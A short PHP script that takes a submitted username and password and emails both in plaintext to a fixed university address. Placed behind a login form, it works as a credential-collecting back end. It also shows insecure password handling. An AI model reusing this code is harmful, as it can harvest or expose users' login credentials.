<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];
    // $destinatario = "destinatario@example.com"; // Cambia esto al correo que desees

    // $usuario = "BNECIOSUP";
    // $contraseña = "12345678";
    $destinatario = "bneciosup@ucvvirtual.edu.pe"; // Cambia esto al correo que desees
    $asunto = "Detalles de Usuario";
    $mensaje = "Hola,\n\nTu usuario es: $usuario\nTu contraseña es: $contraseña";

    // Cabeceras adicionales (opcional)
    $headers = "From: remitente@example.com"; // Cambia esto al correo del remitente

    // Enviar el correo
    if (mail($destinatario, $asunto, $mensaje, $headers)) {
        echo "Correo enviado con éxito.";
    } else {
        echo "Error al enviar el correo.";
    }
}
?>
